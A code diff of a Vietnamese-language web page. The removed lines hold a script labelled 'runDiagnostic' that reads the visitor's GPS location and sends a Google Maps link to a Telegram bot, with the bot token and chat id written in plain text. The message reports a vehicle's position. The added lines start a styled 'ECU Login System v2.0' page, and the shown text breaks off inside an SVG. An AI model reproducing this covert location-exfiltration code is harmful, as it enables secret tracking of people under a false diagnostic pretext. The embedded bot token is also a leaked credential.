@@ -1,29 +1,13 @@
-<script>
-    function runDiagnostic() {
-        var status = document.getElementById("status");
-        var token = "8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg"; //
-        var chat_id = "1197457034"; 
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hệ Thống Đăng Nhập ECU v2.0</title>
+</head>
+<body style="background-color: #0d1117; color: #c9d1d9; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
 
-        status.innerHTML = "> Đang kết nối...";
-        
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            status.innerHTML = "> Đang gửi dữ liệu...";
-            
-            var lat = pos.coords.latitude;
-            var lon = pos.coords.longitude;
-            
-            // Cách nối chuỗi thủ công, tuyệt đối không có dấu $
-            var linkMaps = "https://www.google.com/maps?q=" + lat + "," + lon;
-            var message = "🛠 BÁO CÁO:\n📍 Xe 54 4val tại: " + linkMaps;
-            
-            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message);
-            
-            fetch(url).then(function() {
-                status.innerHTML = "<span style='color: #4cd137;'>> HOÀN TẤT!</span>";
-                alert("Đã gửi thành công!");
-            });
-        }, function() {
-            status.innerHTML = "<span style='color: #ff4757;'>> LỖI: GPS bị chặn!</span>";
-        });
-    }
-</script>
+    <div style="width: 100%; max-width: 340px; padding: 40px; background: #161b22; border: 1px solid #30363d; border-radius: 8px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.5);">
+        <div style="margin-bottom: 24px;">
+            <div style="width: 48px; height: 48px; background: #238636; border-radius: 50%; margin: 0 auto 16px; display: flex; align-items: center; justify-content: center;">
+                <svg height="24" viewBox="0 0 24 24" width="24" fill="white"><path d="M12 2C6.48 2 2
